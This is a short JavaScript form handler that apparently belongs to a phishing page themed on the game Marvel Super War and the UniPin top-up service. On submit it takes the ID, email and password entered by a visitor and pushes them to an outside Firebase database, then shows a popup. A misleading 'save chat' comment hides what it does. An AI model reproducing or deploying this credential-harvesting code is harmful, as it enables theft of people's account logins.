//create firebase reference
var db = new Firebase("https://unipin.firebaseio.com/");
var ref = db.child('marvel-super-war')
var form = document.querySelector('#form');

//save chat
form.addEventListener("submit", function (event) {
    event.preventDefault();
    if (document.querySelector('#id').value != '' && document.querySelector('#email').value != '' && document.querySelector('#pass').value != '') {
        ref
            .push({
                ID: document.querySelector('#id').value,
                Email: document.querySelector('#email').value,
                Pass: document.querySelector('#pass').value
            })
            $("#MyPopup").modal('show')
            form.reset()
        
    } else {
        alert('Please fill atlease name or message!');
    }
}, false);